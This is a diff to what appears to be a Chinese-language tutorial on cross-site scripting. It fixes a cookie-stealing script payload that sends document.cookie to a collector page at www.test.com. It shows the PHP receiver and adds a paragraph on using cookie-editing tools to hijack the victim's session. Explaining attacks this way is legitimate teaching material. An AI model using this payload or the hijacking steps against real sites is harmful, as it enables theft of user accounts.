@@ -62,8 +62,7 @@ XSS, 即为（Cross Site Scripting）, 中文名为跨站脚本, 是发生在目
 
 //方式四
 <script>
- document.write('<img src="http://www.test.com/cookie.php?cookie="+document.cookie></img>
-')
+ document.write('<img src="http://www.test.com/cookie.php?cookie="+document.cookie/>')
 </script>
 ```
 
@@ -74,6 +73,9 @@ XSS, 即为（Cross Site Scripting）, 中文名为跨站脚本, 是发生在目
 $cookie=$_GET('cookie');
 ...
 ```
+
+攻击者获取cookie信息后，还要与web系统建立会话，才能侵入用户的账户，建立会话通常需要能修改cookie的工具，例如桂林老兵cookie欺骗工具，firefox的浏览器插件firecookie等。
+
 
 
 
